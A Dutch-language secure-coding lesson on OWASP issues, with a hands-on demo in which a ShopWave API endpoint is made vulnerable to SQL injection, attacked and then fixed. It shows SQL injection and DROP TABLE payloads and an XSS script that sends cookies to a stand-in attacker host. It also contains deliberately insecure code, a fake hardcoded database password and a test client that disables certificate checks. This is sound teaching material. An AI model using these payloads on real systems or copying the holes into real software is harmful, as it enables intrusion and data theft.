---
title: "Les 8: Theorie - Secure Coding (OWASP)"
sidebar_label: "Theorie"
---

# Les 8: Theorie - Secure Coding (OWASP)

## 1. Waarom code zelf de zwakste schakel is

In de vorige lessen beveiligde je de verbinding (HTTPS), de authenticatie (2FA, BCrypt) en de endpoints (JWT). Maar al die lagen beschermen enkel de buitenkant van de applicatie.

Een aanvaller die een kwetsbaarheid in je code vindt, omzeilt al die bescherming in één keer. Hij stuurt gewoon een HTTP-request naar een endpoint dat je al beveiligd hebt, maar met een ingenieus samengestelde payload in de request body of URL-parameter. De JWT-validatie slaagt. De HTTPS-verbinding is versleuteld. En toch leest hij de volledige database uit.

Dit heet **A03: Injection** in de OWASP Top 10. Het is al jaren de gevaarlijkste categorie kwetsbaarheden.

De kernregel van secure coding: **vertrouw nooit invoer**. Elke waarde die van buitenaf de applicatie binnenkomt, kan kwaadaardig zijn. URL-parameters, POST-body, headers, cookies: alles wat de client stuurt, moet behandeld worden als potentieel gevaarlijk totdat je het tegendeel bewezen hebt.

**Minicontrole:** een aanvaller stuurt een request naar `/orders/zoek?email=alice@shopwave.be`. Het JWT-token is geldig. Toch lukt het hem om alle orders van alle klanten te lezen. Hoe is dat mogelijk als de JWT-validatie slaagt?

---

## 2. SQL Injection

### Het probleem

SQL Injection (een injectie-aanval op een SQL-database) is mogelijk wanneer gebruikersinput rechtstreeks wordt samengevoegd met een SQL-query. De database kan het onderscheid dan niet meer maken tussen de SQL-code die de ontwikkelaar bedoelde en de data die de gebruiker stuurde.

Een zoekfunctie die orders opzoekt op e-mailadres:

```csharp
string query = $"SELECT * FROM orders WHERE email = '{email}'";
```

De ontwikkelaar verwacht een e-mailadres zoals `alice@shopwave.be`. De query wordt dan:

```sql
SELECT * FROM orders WHERE email = 'alice@shopwave.be'
```

Maar wat als een aanvaller dit invoert?

```csharp
' OR '1'='1
```

De samengestelde query wordt:

```sql
SELECT * FROM orders WHERE email = '' OR '1'='1'
```

`OR '1'='1'` is altijd waar. De query geeft alle rijen in de tabel terug, ongeacht het e-mailadres. De aanvaller heeft in één stap de volledige ordertabel uitgelezen.

Gevaarlijker nog:

```csharp
'; DROP TABLE orders --
```

Dit wordt:

```sql
SELECT * FROM orders WHERE email = ''; DROP TABLE orders --'
```

Als de databasegebruiker voldoende rechten heeft, wordt de volledige ordertabel vernietigd. `--` is een SQL-commentaarteken: alles erna wordt genegeerd.

### Bekende incidenten

- **Heartland Payment Systems (2008):** SQL Injection gaf aanvallers toegang tot meer dan 130 miljoen creditcardnummers. Op dat moment de grootste datadiefstal ooit.
- **TalkTalk (2015):** een Britse telecomoperator verloor via SQL Injection de persoonsgegevens van 157.000 klanten. Boete: 400.000 pond. De aanval werd uitgevoerd door een 17-jarige.

### De oplossing: parameterized queries

```csharp
// KWETSBAAR: input rechtstreeks in de query
string query = $"SELECT * FROM orders WHERE email = '{email}'";

// VEILIG: input als losse parameter
SqlCommand command = new SqlCommand(
    "SELECT * FROM orders WHERE email = @email", connection);
command.Parameters.AddWithValue("@email", email);
```

Met een parameterized query stuurt de applicatie de SQL-structuur en de data als twee aparte berichten naar de database. De database behandelt `@email` altijd als een waarde, nooit als SQL-code. Zelfs als de gebruiker `' OR '1'='1` invoert, zoekt de database letterlijk naar dat e-mailadres en vindt niets.

**Minicontrole:** een ontwikkelaar schrijft `email.Replace("'", "''")` om aanhalingstekens te escapen. Waarom is dit geen goede bescherming tegen SQL Injection?

---

## 3. Cross-Site Scripting (XSS)

### Het probleem

**XSS** (cross-site scripting, het injecteren van kwaadaardige scripts in een webpagina) is een aanvalstechniek waarbij een aanvaller JavaScript in een webpagina injecteert die daarna door andere gebruikers bekeken wordt. De browser van de slachtoffers voert die JavaScript uit alsof het code is van de eigenaar van de site.

Er zijn drie varianten:

| Variant | Hoe werkt het? |
|---------|----------------|
| Stored XSS | De payload wordt opgeslagen in de database via een commentaar- of notitieveld en uitgevoerd bij elke bezoeker die de pagina laadt |
| Reflected XSS | De payload zit in de URL als zoekterm en wordt direct teruggekaatst in de response |
| DOM-based XSS | De payload manipuleert het DOM client-side via JavaScript, zonder dat de server er iets mee te maken heeft |

Een commentaarsysteem dat input toont zonder encoding:

```html
<!-- KWETSBAAR -->
<p>@Html.Raw(comment.Text)</p>
```

Als een aanvaller dit als commentaar plaatst:

```html
<script>
  fetch('https://aanvaller.be/steal?cookie=' + document.cookie);
</script>
```

Wordt dit script letterlijk in de HTML-pagina opgenomen. Elke bezoeker die de pagina laadt, voert dat script uit. De aanvaller ontvangt de sessietokens van alle bezoekers op zijn eigen server.

### Bekende incidenten

- **British Airways (2018):** aanvallers injecteerden via XSS een script op de betaalpagina dat creditcardgegevens van 500.000 klanten naar een externe server stuurde. Boete: 20 miljoen pond (GDPR).
- **Twitter (2010):** de "onMouseOver"-worm verspreidde zich viraal via een XSS-kwetsbaarheid. Gebruikers die over een tweet hoverkten, plaatsten automatisch berichten.

### De oplossing: output encoding

```html
<!-- KWETSBAAR: Html.Raw geeft ruwe HTML door -->
<p>@Html.Raw(comment.Text)</p>

<!-- VEILIG: Razor encodeert automatisch -->
<p>@comment.Text</p>
```

Razor encodeert automatisch wanneer je `@variabele` schrijft. De tekst `<script>alert('xss')</script>` wordt weergegeven als de letterlijke tekst `&lt;script&gt;alert('xss')&lt;/script&gt;`. De browser ziet dit als tekst, niet als code.

`Html.Raw()` vertelt Razor uitdrukkelijk: render dit als ruwe HTML, codeer niets. Dit is bijna nooit wat je wil bij gebruikersinput.

In een Minimal API zoals ShopWave retourneren we JSON, geen HTML. XSS is hier minder direct van toepassing. Maar de onderliggende regel geldt overal: vertrouw nooit input, codeer altijd output.

**Minicontrole:** een aanvaller plaatst een commentaar met `<img src="x" onerror="stealCookies()">`. `Html.Raw()` wordt gebruikt. Wat gebeurt er als een andere gebruiker de pagina laadt?

---

## 4. Security Misconfiguration

### Het probleem

**Security Misconfiguration** (A05) is geen aanvalstechniek maar een categorie van fouten in de configuratie van een applicatie of server. De code zelf kan correct zijn. Het is de manier waarop de applicatie geconfigureerd is die het probleem veroorzaakt.

Veelvoorkomende vormen:

- Developer Exception Page actief in productie: lekt stack traces, bestandspaden en databaseverbindingsstrings
- Swagger publiek beschikbaar: toont de volledige API-structuur aan iedereen
- Geheimen hardcoded in code of configuratiebestanden die in een Git-repository terechtkomen
- HTTPS niet verplicht: de applicatie accepteert ook onbeveiligde HTTP-verbindingen
- Standaardwachtwoorden op database of admin-panel

### Waarom is dit zo gevaarlijk?

Een aanvaller start een aanval bijna altijd met een verkenningsfase. Hij verzamelt informatie: welke server, welk framework, welke versie, welke endpoints bestaan er?

Een Developer Exception Page geeft hem in één keer:
- het exacte framework en de versie
- de volledige bestandsstructuur van de applicatie
- de connectiestring naar de database
- de interne variabelenamen en waarden op het moment van de fout

Met die informatie zoekt hij gericht bekende kwetsbaarheden op voor die specifieke versie.

### Bekende incidenten

- **Equifax (2017):** een bekende kwetsbaarheid in Apache Struts was al maanden gepubliceerd maar niet gepatcht. 147 miljoen Amerikanen verloren hun persoonsgegevens, waaronder burgerservicenummers en kredietscores. Boetes en schikkingen: meer dan 700 miljoen dollar.
- **GitHub-tokens in publieke repositories (doorlopend):** dagelijks worden duizenden API-sleutels en wachtwoorden per ongeluk gepubliceerd op GitHub. Bots scannen continu en misbruiken die gegevens binnen minuten.

### De oplossing: omgevingsafhankelijke configuratie

De kernregel: wat nuttig is in development, is gevaarlijk in productie.

```csharp
// KWETSBAAR: altijd aan, ook in productie
app.UseDeveloperExceptionPage();

// VEILIG: enkel in development
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
else
{
    app.UseExceptionHandler(errorApp =>
    {
        errorApp.Run(async context =>
        {
            context.Response.StatusCode = 500;
            await context.Response.WriteAsync("Er is een fout opgetreden.");
        });
    });
}
```

Voor geheimen: gebruik omgevingsvariabelen in development en een geheimenbeheerder zoals Azure Key Vault in productie. Nooit hardcoded in code of configuratiebestanden.

**Minicontrole:** een ontwikkelaar deployt ShopWave.Api naar een productieserver maar vergeet de omgevingsvariabele `JWT_SECRET_KEY` in te stellen. Wat gebeurt er bij het opstarten? Is dat beter of slechter dan wanneer de applicatie gewoon doordraait met een lege sleutel?

---

## 5. Input validatie en Least Trust

### Het probleem

**Input validatie** is het proces waarbij je elke waarde die van buitenaf de applicatie binnenkomt controleert voor je er iets mee doet. "Van buitenaf" betekent: URL-parameters, POST-body, headers, cookies. Alles wat de client stuurt.

Het onderliggende principe heet **Least Trust**: ga er altijd van uit dat input kwaadaardig of incorrect is totdat je het tegendeel bewezen hebt.

Drie redenen waarom dit systematisch vergeten wordt:

1. De client valideert al. Maar client-side validatie is triviaal te omzeilen via DevTools of een HTTP-client zoals Postman.
2. De invoer komt van een intern systeem. Maar ook interne systemen kunnen gecompromitteerd worden.
3. Het is maar een demo. Maar demo-code eindigt vaker in productie dan je denkt.

### Wat valideer je?

| Eigenschap | Voorbeeld |
|-----------|-----------|
| Aanwezig | E-mailadres mag niet leeg zijn |
| Formaat | E-mailadres moet een `@` bevatten |
| Lengte | Wachtwoord minstens 8 tekens, maximaal 128 tekens |
| Type | Leeftijd moet een getal zijn, geen tekst |
| Bereik | Kortingspercentage tussen 0 en 100 |
| Toegestane waarden | Status moet `"pending"`, `"shipped"` of `"cancelled"` zijn |

De maximumlengte van 128 tekens bij wachtwoorden beschermt tegen een specifieke aanval: een aanvaller stuurt een extreem lang wachtwoord om het hashing-algoritme te vertragen en de server te overbelasten.

### Wat geef je terug bij ongeldige input?

Een `400 Bad Request` met een begrijpelijke melding over wat er fout is, zonder interne details prijs te geven. Nooit een `500 Internal Server Error` bij ongeldige input: dat betekent dat je code crasht op iets wat een gebruiker stuurde.

**Minicontrole:** een gebruiker stuurt een POST naar `/register` met een wachtwoord van 50.000 tekens. De applicatie heeft geen maximumlengte-validatie. BCrypt gaat aan de slag. Wat is het gevolg voor de server?

---

## 6. CORS

### Het probleem

**CORS** (Cross-Origin Resource Sharing, het beleid dat bepaalt welke externe origins een API mogen aanroepen) is een beveiligingsmechanisme in browsers. Het voorkomt dat een script op `aanvaller.be` een request stuurt naar `api.shopwave.be` namens een ingelogde gebruiker.

Zonder CORS-beleid zou de volgende aanval werken:

1. Een aanvaller stuurt je een link naar `aanvaller.be`.
2. Je browser laadt die pagina. De pagina bevat JavaScript.
3. Dat script stuurt een request naar `api.shopwave.be/orders` met je JWT-token uit local storage.
4. De ShopWave API antwoordt met jouw ordergegevens.
5. Het script stuurt die gegevens naar de server van de aanvaller.

CORS voorkomt stap 4: de browser weigert de response van de API als de API geen expliciete toestemming geeft aan `aanvaller.be`.

### De misconfiguratie

```csharp
// KWETSBAAR: elke origin mag de API aanroepen
builder.Services.AddCors(options =>
{
    options.AddPolicy("Open", policy =>
    {
        policy.AllowAnyOrigin()
              .AllowAnyHeader()
              .AllowAnyMethod();
    });
});
```

`AllowAnyOrigin()` schakelt CORS-beveiliging effectief uit. Elk script op elk domein mag de API aanroepen.

### De oplossing

```csharp
// VEILIG: enkel de ShopWave-frontend mag de API aanroepen
builder.Services.AddCors(options =>
{
    options.AddPolicy("ShopWavePolicy", policy =>
    {
        policy.WithOrigins("https://shopwave.be", "https://localhost:3000")
              .AllowAnyHeader()
              .AllowAnyMethod();
    });
});

app.UseCors("ShopWavePolicy");
```

`WithOrigins(...)` geeft expliciet aan welke origins toegestaan zijn. In development voeg je `"https://localhost:3000"` toe als je frontend lokaal draait.

**Minicontrole:** CORS is een beveiliging in de browser. Wat als een aanvaller een HTTP-client gebruikt zoals Postman of curl in plaats van een browser? Helpt CORS dan nog?

---

## 7. Rate limiting

### Het probleem

Zonder rate limiting kan een aanvaller onbeperkt loginpogingen doen. Een script dat 10.000 wachtwoorden per minuut probeert, vindt een zwak wachtwoord in minuten. Dit heet een **brute-force aanval**.

ShopWave heeft al 2FA als extra laag, maar het is beter de aanval vroeg te stoppen dan hem door te laten komen tot de 2FA-stap.

### De oplossing

ASP.NET Core 7 en hoger heeft ingebouwde rate limiting via `AddRateLimiter`. Een fixed window limiter staat een vast aantal requests toe per tijdsvenster:

```csharp
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("login", limiterOptions =>
    {
        limiterOptions.Window      = TimeSpan.FromMinutes(1);
        limiterOptions.PermitLimit = 5;
        limiterOptions.QueueLimit  = 0;
        limiterOptions.QueueProcessingOrder =
            System.Threading.RateLimiting.QueueProcessingOrder.OldestFirst;
    });
});

app.UseRateLimiter();
```

Pas de limiet toe op het login-endpoint:

```csharp
app.MapPost("/login", HandleLogin)
   .RequireRateLimiting("login");
```

Een IP-adres dat meer dan 5 loginpogingen per minuut doet, krijgt `429 Too Many Requests` terug.

**Minicontrole:** een aanvaller gebruikt 1000 verschillende IP-adressen om de rate limiting te omzeilen. Welke aanvullende maatregel zou ShopWave kunnen nemen?

---

## 8. Demo: kwetsbaarheden bouwen en fixen in ShopWave

Je bouwt verder op `ShopWave.Api` uit les 7. Geen nieuw project.

---

### Stap 8a: In-memory database aanmaken

Voeg een gesimuleerde orderdatabase toe in `ShopWave.Api/Program.cs`, na de service-aanmaak:

```csharp
List<string> orderDatabase = new List<string>
{
    "alice@shopwave.be|Laptop|999.99",
    "bob@shopwave.be|Muis|29.99",
    "alice@shopwave.be|Toetsenbord|79.99",
    "admin@shopwave.be|Server|4999.99"
};
```

**Wat je ziet:** het project compileert. De lijst staat klaar als datasource voor de volgende stappen.

---

### Stap 8b: Kwetsbaar zoekendpoint toevoegen

Voeg het kwetsbare endpoint toe:

```csharp
app.MapGet("/orders/zoek", HandleZoek);

IResult HandleZoek(string email)
{
    // KWETSBAAR: input rechtstreeks in de "query" geplakt
    string query = $"SELECT * FROM orders WHERE email = '{email}'";
    Console.WriteLine($"[KWETSBAAR] Query: {query}");

    List<string> results = orderDatabase
        .Where(order => order.Contains(email))
        .ToList();

    return Results.Ok(new { Query = query, Results = results });
}
```

**Wat je ziet:** ga naar `https://localhost:5001/orders/zoek?email=alice@shopwave.be`. Je ziet de twee orders van Alice en de samengestelde query in de console.

---

### Stap 8c: De aanval uitvoeren

Ga nu naar:

```csharp
https://localhost:5001/orders/zoek?email=' OR '1'='1
```

**Wat je ziet in de console:**

```csharp
[KWETSBAAR] Query: SELECT * FROM orders WHERE email = '' OR '1'='1'
```

**Wat je ziet in de browser:** alle vier de orders, inclusief die van `admin@shopwave.be`. In een echte database zou de aanvaller de volledige klanttabel kunnen uitlezen.

---

### Stap 8d: Zoekendpoint fixen

Vervang `HandleZoek` door de veilige versie:

```csharp
IResult HandleZoek(string email)
{
    // VEILIG: de zoekopdracht staat volledig los van de "query-structuur"
    // In een echte SQL-database gebruik je SqlCommand met Parameters.AddWithValue("@email", email)
    // De database behandelt @email altijd als waarde, nooit als SQL-code
    Console.WriteLine($"[VEILIG] Zoeken op e-mail: {email}");

    List<string> results = orderDatabase
        .Where(order => order.StartsWith(email + "|", StringComparison.OrdinalIgnoreCase))
        .ToList();

    return Results.Ok(new { Results = results });
}
```

**Wat je ziet:** dezelfde aanval met `' OR '1'='1` geeft nu een lege lijst terug. De injectie heeft geen effect meer.

---

### Stap 8e: Developer Exception Page omgevingsafhankelijk maken

Voeg een crashend endpoint toe om de misconfiguratie te demonstreren:

```csharp
app.MapGet("/crash", HandleCrash);

IResult HandleCrash()
{
    throw new InvalidOperationException(
        "Verbinding mislukt op SHOPWAVE-DB-01 (192.168.1.50:3306). " +
        "Connection string: Server=192.168.1.50;Uid=shopwave_admin;Pwd=ShopW@ve2024!");
}
```

Voeg de omgevingsafhankelijke foutafhandeling toe, voor de endpoints:

```csharp
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
else
{
    app.UseExceptionHandler(errorApp =>
    {
        errorApp.Run(async context =>
        {
            Microsoft.AspNetCore.Diagnostics.IExceptionHandlerFeature? feature =
                context.Features.Get<
                    Microsoft.AspNetCore.Diagnostics.IExceptionHandlerFeature>();

            if (feature != null)
            {
                Console.Error.WriteLine($"[FOUT] {feature.Error.Message}");
            }

            context.Response.StatusCode = 500;
            await context.Response.WriteAsync("Er is een fout opgetreden.");
        });
    });
}
```

**Wat je ziet in development:** ga naar `/crash`. De volledige stack trace is zichtbaar inclusief het IP-adres van de database en het wachtwoord.

Stel tijdelijk `ASPNETCORE_ENVIRONMENT=Production` in als omgevingsvariabele en herstart. Ga opnieuw naar `/crash`. De browser toont enkel: `Er is een fout opgetreden.`

---

### Stap 8f: Input validatie op het register-endpoint

Vervang het bestaande register-endpoint door een versie met volledige validatie:

```csharp
app.MapPost("/register", HandleRegister);

IResult HandleRegister(RegisterRequest request)
{
    if (string.IsNullOrWhiteSpace(request.Email))
    {
        return Results.BadRequest(new { Error = "E-mailadres is verplicht." });
    }

    if (!request.Email.Contains("@") || !request.Email.Contains("."))
    {
        return Results.BadRequest(new { Error = "Ongeldig e-mailadres." });
    }

    if (string.IsNullOrWhiteSpace(request.Password))
    {
        return Results.BadRequest(new { Error = "Wachtwoord is verplicht." });
    }

    if (request.Password.Length < 8)
    {
        return Results.BadRequest(new { Error = "Wachtwoord moet minstens 8 tekens bevatten." });
    }

    if (request.Password.Length > 128)
    {
        return Results.BadRequest(new { Error = "Wachtwoord mag maximaal 128 tekens bevatten." });
    }

    accountRepository.Register(request.Email, request.Password);
    return Results.Ok(new { Message = "Geregistreerd." });
}

record RegisterRequest(string Email, string Password);
```

**Wat je ziet:** stuur een POST naar `/register` met een leeg e-mailadres. Je krijgt `400 Bad Request` met `{"error":"E-mailadres is verplicht."}`.

---

### Stap 8g: CORS configureren

Voeg CORS toe aan de builder, voor `builder.Build()`:

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("ShopWavePolicy", policy =>
    {
        policy.WithOrigins("https://shopwave.be", "https://localhost:3000")
              .AllowAnyHeader()
              .AllowAnyMethod();
    });
});
```

Activeer CORS in de pipeline, na `app.UseAuthentication()`:

```csharp
app.UseCors("ShopWavePolicy");
```

**Wat je ziet:** een request vanuit JavaScript op `aanvaller.be` naar de ShopWave API wordt geweigerd door de browser. Een request vanuit Postman werkt nog wel: CORS is een browserbeveiliging, geen serverbeveiliging.

---

### Stap 8h: Rate limiting op het login-endpoint

Voeg rate limiting toe aan de builder:

```csharp
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("login", limiterOptions =>
    {
        limiterOptions.Window      = TimeSpan.FromMinutes(1);
        limiterOptions.PermitLimit = 5;
        limiterOptions.QueueLimit  = 0;
        limiterOptions.QueueProcessingOrder =
            System.Threading.RateLimiting.QueueProcessingOrder.OldestFirst;
    });
});
```

Activeer in de pipeline:

```csharp
app.UseRateLimiter();
```

Pas toe op het login-endpoint:

```csharp
app.MapPost("/login", HandleLogin)
   .RequireRateLimiting("login");
```

**Wat je ziet:** stuur meer dan 5 loginrequests per minuut. De zesde request krijgt `429 Too Many Requests` terug.

---

### Stap 8i: Kwetsbare packages opsporen

Voer dit uit in de terminal in de map van de solution:

```csharp
dotnet list package --vulnerable
```

**Wat je ziet:** als er NuGet-packages zijn met bekende kwetsbaarheden, verschijnen ze hier met het CVE-nummer en de ernst. Update ze onmiddellijk. Voer dit commando regelmatig uit en zeker voor elke release naar productie.

---

### Stap 8j: De volledige flow testen vanuit de console

Voeg tijdelijk toe aan `ShopWave/Program.cs`:

```csharp
using System.Net.Http;
using System.Text;
using System.Text.Json;

HttpClientHandler handler = new HttpClientHandler();
handler.ServerCertificateCustomValidationCallback =
    (message, certificate, chain, errors) => true;

HttpClient client = new HttpClient(handler);
client.BaseAddress = new Uri("https://localhost:5001");

// Test 1: normale zoekopdracht
Console.WriteLine("=== Test 1: Normale zoekopdracht ===");
HttpResponseMessage normalSearch = client.GetAsync(
    "/orders/zoek?email=alice@shopwave.be").Result;
Console.WriteLine(normalSearch.Content.ReadAsStringAsync().Result);

// Test 2: SQL Injection poging
Console.WriteLine("=== Test 2: SQL Injection poging ===");
HttpResponseMessage injectionAttempt = client.GetAsync(
    "/orders/zoek?email=' OR '1'='1").Result;
Console.WriteLine(injectionAttempt.Content.ReadAsStringAsync().Result);

// Test 3: input validatie
Console.WriteLine("=== Test 3: Input validatie ===");
string emptyEmail = JsonSerializer.Serialize(new { email = "", password = "wachtwoord123" });
HttpResponseMessage emptyEmailResponse = client.PostAsync("/register",
    new StringContent(emptyEmail, Encoding.UTF8, "application/json")).Result;
Console.WriteLine($"Leeg e-mail: {emptyEmailResponse.StatusCode}");
Console.WriteLine(emptyEmailResponse.Content.ReadAsStringAsync().Result);

string shortPassword = JsonSerializer.Serialize(new { email = "test@shopwave.be", password = "kort" });
HttpResponseMessage shortPasswordResponse = client.PostAsync("/register",
    new StringContent(shortPassword, Encoding.UTF8, "application/json")).Result;
Console.WriteLine($"Kort wachtwoord: {shortPasswordResponse.StatusCode}");
Console.WriteLine(shortPasswordResponse.Content.ReadAsStringAsync().Result);

// Test 4: foutafhandeling
Console.WriteLine("=== Test 4: Foutafhandeling ===");
HttpResponseMessage crashResponse = client.GetAsync("/crash").Result;
Console.WriteLine($"Crash: {crashResponse.StatusCode}");
Console.WriteLine(crashResponse.Content.ReadAsStringAsync().Result);

handler.Dispose();
client.Dispose();
```

**Wat je ziet:**

```csharp
=== Test 1: Normale zoekopdracht ===
{"results":["alice@shopwave.be|Laptop|999.99","alice@shopwave.be|Toetsenbord|79.99"]}
=== Test 2: SQL Injection poging ===
{"results":[]}
=== Test 3: Input validatie ===
Leeg e-mail: BadRequest
{"error":"E-mailadres is verplicht."}
Kort wachtwoord: BadRequest
{"error":"Wachtwoord moet minstens 8 tekens bevatten."}
=== Test 4: Foutafhandeling ===
Crash: InternalServerError
Er is een fout opgetreden.
```

---

## 9. Samenvatting

| Kwetsbaarheid | OWASP | Oorzaak | Oplossing |
|--------------|-------|---------|-----------|
| SQL Injection | A03 | Input in query via string interpolatie | Parameterized queries |
| XSS | A03 | Input in HTML zonder encoding | Output encoding via Razor |
| Developer Exception Page in productie | A05 | Altijd aan | Omgevingsafhankelijke configuratie |
| Geheimen in broncode | A05 | Hardcoded in `Program.cs` | Omgevingsvariabelen, Azure Key Vault |
| Ontbrekende input validatie | A04 | Blind vertrouwen in de client | Server-side validatie op elk endpoint |
| CORS te open | A05 | `AllowAnyOrigin()` | `WithOrigins(...)` met expliciete lijst |
| Geen rate limiting | A07 | Onbeperkt loginpogingen | `AddRateLimiter` met fixed window |
| Verouderde packages | A06 | NuGet-pakket met bekende CVE | `dotnet list package --vulnerable` |

**De gouden regel van secure coding:**

Vertrouw nooit input. Valideer altijd server-side. Codeer altijd output. Configureer per omgeving. Hardcode nooit geheimen. Scan regelmatig op kwetsbare dependencies.
